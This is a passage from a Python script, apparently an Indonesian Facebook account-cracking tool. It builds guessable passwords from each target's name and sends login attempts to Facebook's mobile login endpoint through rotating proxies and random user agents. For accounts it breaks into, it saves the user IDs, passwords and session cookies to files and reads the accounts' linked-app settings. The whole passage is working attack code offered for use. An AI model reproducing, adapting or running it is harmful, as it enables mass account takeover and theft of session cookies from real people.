			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	print(f'{P}[>] Crack Telah Selesai Jangan Lupa Amankan Hasil Cracknya{N}')
	print(f'[{h}>{x}] {h}OK{x} : {h}%s{x} '%(ok))
	print(f'[{k}>{x}] {k}CP{x} : {k}%s{x} '%(cp))
	print(f'{P}[>] Good Bye Thanks To Using My Script{N}')
	time.sleep(3)
	back()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r🙈 {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua =random.choice(ugen)
	ua2 =random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}——> {K}{idf}|{pw}\n——> {ua}{N}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r{x}——> {H}{idf}|{pw}\n——> {kuki}\n——> {m}{ua}{N}')
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
						nok+=1

					hit=0
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
					print(f'\r{x}——> {H}{idf}|{pw}|{kuki}\n{infoakun}{x}')
					os.popen('play-audio data/ok.mp3')
					ok+=1
					break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/ALVINO-DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass
	try:os.system('clear')
	except:pass
	login()

#>>>>> THANKS TO THIS HERE <<<<<<<#
#>>>>> Alvino_Adijaya_Xy <<<<<#
